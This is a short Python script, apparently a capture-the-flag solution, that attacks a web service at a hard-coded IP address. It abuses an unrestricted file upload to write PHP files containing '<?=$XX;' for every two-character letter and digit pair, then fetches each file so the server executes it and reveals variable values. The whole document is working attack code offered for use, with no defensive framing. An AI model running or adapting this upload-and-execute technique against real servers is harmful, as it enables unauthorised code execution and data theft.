__author__ = 'ahallmann'

import requests
import re
import sys
import string
import itertools

chars = list(string.ascii_letters)
numbers = list(string.digits)
charsAndNumbers = chars + numbers
permutatedCharsAndNumbers = list(itertools.permutations(charsAndNumbers, 2))
niceListOfCharsAndNumbers = []

for v in permutatedCharsAndNumbers:
    niceListOfCharsAndNumbers.append(v[0] + v[1])


for v in niceListOfCharsAndNumbers:
    r = requests.post("http://136.243.194.53/",
          data={
              'filename': 'foo_' + v + '.php',
              'content': '<?=$'+v+';\n'
          }
    )
    if r.status_code != 200:
        print(r.status_code, r.reason)
        print(r.text)
        sys.exit(1)

    pattern = re.compile(re.escape('<a>') + '(.*?)' + re.escape('</a>'))
    result = re.findall(pattern, r.text)

    if len(result) != 1:
        print("not saved correctly")
        print(r.text)
        sys.exit(1)

    url = "http://136.243.194.53/" + result[0]
    #print("got " + url)

    r = requests.get(url)
    if r.status_code != 200:
        if r.text:
            print(r.status_code, r.reason)
            print(r.text)
            exit()
        sys.exit(1)


    print r.text
    sys.stdout.flush()